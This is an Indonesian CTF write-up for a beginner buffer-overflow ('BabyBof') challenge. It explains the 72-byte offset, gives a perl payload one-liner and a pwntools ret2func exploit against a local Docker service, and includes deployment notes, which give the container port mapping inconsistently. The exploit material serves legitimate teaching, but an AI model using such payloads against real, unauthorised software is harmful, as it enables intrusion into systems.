---
title: Write Up PWN BabyBof ASTROXNFSCC 2025
description: Dokumentasi mengenai penyelesaian soal PWN BabyBof
author: Kada
date: 2025-12-10 00:00:00 +0700
categories: [Blogging, WU]
tags: [CTF]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/favicons/linux.png
  # lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Responsive rendering of Chirpy theme on multiple devices.
---

# Baby BOF (Buffer Overflow) Challenge

## Deskripsi Soal

Challenge ini adalah latihan dasar untuk memahami konsep Buffer Overflow (BOF) dalam dunia eksploitasi binary. Anda akan dihadapkan pada program sederhana yang memiliki kerentanan buffer overflow yang dapat dieksploitasi untuk mendapatkan akses ke flag.

Tujuan dari challenge ini adalah untuk mengalihkan eksekusi program ke fungsi `admin()` yang akan menampilkan flag.

## Analisis Program

Program ini memiliki beberapa karakteristik penting yang memudahkan eksploitasi:

1. **Fungsi `my_gets()`**: Fungsi buatan yang tidak melakukan pemeriksaan batas buffer, menyebabkan buffer overflow
2. **Fungsi `admin()`**: Fungsi yang membaca flag saat dipanggil
3. **Fungsi `vuln()`**: Fungsi utama yang memiliki buffer berukuran 64 byte yang rentan
4. **Stack Canary**: Tidak diaktifkan (no-stack-protector)
5. **ASLR**: Dinonaktifkan dalam container Docker untuk stabilitas eksploitasi

## Tujuan Challenge

Eksploitasi buffer overflow untuk mengganti nilai return address dan mengarahkan eksekusi ke fungsi `admin()`, sehingga flag bisa didapatkan.

## Teknik yang Dipelajari

- Buffer Overflow dasar
- Offset calculation (menggunakan cyclic pattern)
- Return-to-function (ret2func) exploitation
- Little endian byte ordering
- Penggunaan tools seperti pwntools

## Cara Menjalankan Challenge Secara Lokal

### Menggunakan Docker (rekomendasi):
```bash
# Bangun dan jalankan container
docker build -t babybof .
docker run -d -p 1600:1600 --name babybof-container babybof

# Koneksi ke challenge
nc localhost 1600

# Setelah selesai
docker stop babybof-container
docker rm babybof-container
```

### Menggunakan docker-compose:
```bash
docker-compose up -d
```

## File dalam Challenge

- `babybof.c`: Source code program (jika tersedia)
- `babybof`: Binary executable yang rentan
- `flag.txt`: File berisi flag (hanya bisa dibaca oleh program)
- `Dockerfile`: Konfigurasi container untuk challenge
- `docker-compose.yml`: Alternatif untuk menjalankan challenge
- `exploit.py`: Contoh eksploitasi
- `offset.py`: Script untuk menghitung offset overflow

## Hints

**Hint 1**: Gunakan teknik pattern cyclic untuk menentukan offset overflow. Gunakan `cyclic(200)` untuk menghasilkan input unik dan lihat nilai register saat crash.

**Hint 2**: Fungsi `admin()` berisi kode yang membaca flag. Tujuan Anda adalah mengalihkan eksekusi ke fungsi ini.

**Hint 3**: Buffer hanya 64 byte, tetapi Anda perlu melewati juga saved RBP (8 byte di x86_64) sebelum mencapai return address.

**Hint 4**: Total offset dari awal buffer ke return address adalah 64 (buffer) + 8 (saved rbp) = 72 byte.

**Hint 5**: Setelah 72 byte pertama, tambahkan alamat fungsi `admin()` dalam format little-endian.

**Hint 6**: Alamat fungsi `admin()` bisa ditemukan menggunakan perintah seperti `nm -n babybof` atau `objdump -t babybof`.

**Hint 7**: Gunakan pwntools untuk membuat payload secara efisien. Contoh: `p64(address)`

**Hint 8**: Jika Anda tidak yakin dengan alamat fungsi, gunakan `objdump -d babybof` untuk melihat disassembly dan temukan alamat fungsi `admin`.

## Referensi Belajar

1. **Buffer Overflow Dasar**:
   - https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
   - https://www.tenouk.com/Bufferoverflowc/

2. **pwntools Documentation**:
   - https://docs.pwntools.com/en/stable/
   - Tutorial interaktif: https://github.com/Gallopsled/pwntools-tutorial

3. **Binary Exploitation**:
   - "Hacking: The Art of Exploitation" oleh Jon Erickson
   - "Practical Binary Analysis" oleh Dennis Andriesse

4. **x86_64 Assembly**:
   - https://wiki.skullsecurity.org/index.php?title=Architecture
   - https://www.felixcloutier.com/x86/

5. **Video Tutorial**:
   - Live Overflow: Binary Exploitation Series
   - John Hammond: CTF videos (termasuk buffer overflow)

## Tips untuk Pemula

- Mulailah dengan memahami bagaimana stack bekerja di arsitektur x86_64
- Gunakan debugger seperti GDB untuk mengamati perubahan register dan stack saat program dijalankan
- Latih dengan program sederhana sebelum menangani challenge yang lebih kompleks
- Pelajari konsep little-endian dan bagaimana data disusun dalam memori
- Gunakan cyclic pattern untuk menemukan offset secara akurat

## Solve Challenge

### Pendekatan Manual

1. **Temukan offset overflow**:
   ```bash
   python3 -c "from pwn import *; print(cyclic(200))" | ./babybof
   ```
   Setelah program crash, lihat nilai RIP register untuk menentukan offset:
   ```bash
   python3 -c "from pwn import *; print(hex(cyclic_find(0x6161616b)))"  # ganti dengan nilai crash dari GDB
   ```

2. **Temukan alamat fungsi admin**:
   ```bash
   nm -n babybof | grep admin
   # atau
   objdump -t babybof | grep admin
   ```

3. **Buat payload manual**:
   ```bash
   perl -e 'print "A" x 72 . "\x66\x11\x40\x00\x00\x00\x00\x00"' | nc localhost 1600
   ```
   *(ganti alamat dengan nilai yang benar dari langkah 2, dalam format little-endian)*

### Menggunakan pwntools (Python)

1. **Jalankan offset.py untuk menemukan offset**:
   ```bash
   python3 offset.py
   ```

2. **Gunakan exploit.py yang sudah disediakan**:
   ```bash
   python3 exploit.py
   ```

   Jika Anda ingin menulis exploit dari awal:
   ```python
   #!/usr/bin/env python3
   from pwn import *

   # Ganti dengan alamat fungsi admin yang sebenarnya
   admin_addr = 0x401166  # contoh: dapatkan dari nm -n babybof
   offset = 72  # buffer (64) + saved rbp (8)

   payload = b"A" * offset + p64(admin_addr)

   # Untuk local testing
   # p = process('./babybof')
   # p.sendline(payload)
   # print(p.recvall().decode())

   # Untuk remote exploit
   p = remote('localhost', 1600)
   p.recvuntil(b"Your name: ")
   p.sendline(payload)
   print(p.recvall().decode())
   ```

### Catatan Penting

- Di lokal dengan ASLR dimatikan, alamat fungsi akan konsisten
- Di remote server, jika PIE dimatikan (seperti dalam Dockerfile ini), alamat fungsi juga akan konsisten
- Offset 72 terdiri dari 64 byte buffer + 8 byte saved RBP (stack frame pointer)
- Format little-endian penting karena arsitektur x86_64 menyimpan data dari LSB ke MSB

## Deploy Challenge

### Prasyarat Deploy

- Docker Engine terinstall di sistem target
- Port 1600 tidak digunakan oleh service lain
- Pengguna memiliki akses untuk menjalankan perintah docker

### Menggunakan Docker Build

1. **Bangun image Docker**:
   ```bash
   cd soal/Baby_BOF
   docker build -t babybof .
   ```

2. **Jalankan container**:
   ```bash
   docker run -d -p 1600:4444 --name babybof-container babybof
   ```

3. **Verifikasi service berjalan**:
   ```bash
   docker ps
   nc localhost 1600
   ```

4. **Testing dengan payload exploit**:
   ```bash
   python3 exploit.py
   ```

### Menggunakan Docker Compose (Alternatif)

1. **Jalankan service dengan docker-compose**:
   ```bash
   cd soal/Baby_BOF
   docker-compose up -d
   ```

2. **Verifikasi dan testing**:
   ```bash
   docker-compose ps
   nc localhost 1600
   python3 exploit.py
   ```

### Monitoring dan Troubleshooting

1. **Lihat log container**:
   ```bash
   docker logs babybof-container
   # atau
   docker-compose logs
   ```

2. **Akses shell dalam container**:
   ```bash
   docker exec -it babybof-container /bin/bash
   ```

3. **Debug program langsung**:
   ```bash
   docker run -it --rm -v $(pwd):/workdir --entrypoint /bin/bash babybof
   cd /workdir
   gdb ./babybof
   ```

### Cleanup

- **Stop dan hapus container**:
  ```bash
  docker stop babybof-container
  docker rm babybof-container
  # atau jika pakai docker-compose
  docker-compose down
  ```

- **Hapus image jika tidak dibutuhkan**:
  ```bash
  docker rmi babybof
  ```

### Konfigurasi Security (Opsional)

- Untuk CTF production, tambahkan user namespace remapping
- Gunakan Docker seccomp profile untuk membatasi syscall
- Batasi resource container (memory, CPU) untuk mencegah DoS
- Gunakan network terisolasi khusus untuk challenge, bukan bridge default

### Integrasi CTF Platform

Untuk integrasi dengan platform CTF seperti CTFd:

1. Service harus dapat diakses oleh CTF platform di port 1600
2. Buat health check endpoint atau script untuk monitoring
3. Siapkan backup flag.txt jika original diubah oleh peserta
4. Pertimbangkan untuk menggunakan restart policy `unless-stopped` seperti dalam docker-compose.yml
